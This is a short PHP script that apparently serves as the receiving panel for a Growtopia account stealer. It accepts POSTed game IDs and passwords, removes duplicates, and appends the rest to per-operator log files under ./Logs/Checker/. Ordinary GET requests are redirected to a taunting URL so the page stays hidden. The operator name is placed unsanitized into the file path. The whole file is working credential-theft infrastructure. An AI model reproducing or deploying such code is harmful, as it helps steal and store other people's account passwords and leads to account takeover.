<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
header("Location: http://www.googledaariyim.com/?q=Are+you+Dumb?"); /* Tarayıcıyı yönlendir */
}

if (isset($_POST['checker']))
{
      $growid = $_POST['growid'];
      $password = $_POST['password'];
      $username = $_POST['user'];
      $date = $_POST['date'];
      $fh = fopen('./Logs/Checker/'. $username .  '.txt','r');
      $what = "";
      $txt = $growid . ";" . $password . ";" . $date . "+";
      $txt2 = $growid . ";" . $password . ";";
$texts = "";
while ($line = fgets($fh)) {
  $texts .= $line;
}
if (strpos($texts, $txt2) !== false) 
{
$what = "true";
}
else
{
$what = "false"; 
}

if (strpos($what, 'false') !== false) {
      $txt = $growid . ";" . $password . ";" . $date . "+";
      file_put_contents('./Logs/Checker/'. $username .  '.txt', file_get_contents('./Logs/Checker/'. $username .  '.txt') . $txt);
      echo "Sent log.";
}
else{
      echo "Already have.";
}
}

?>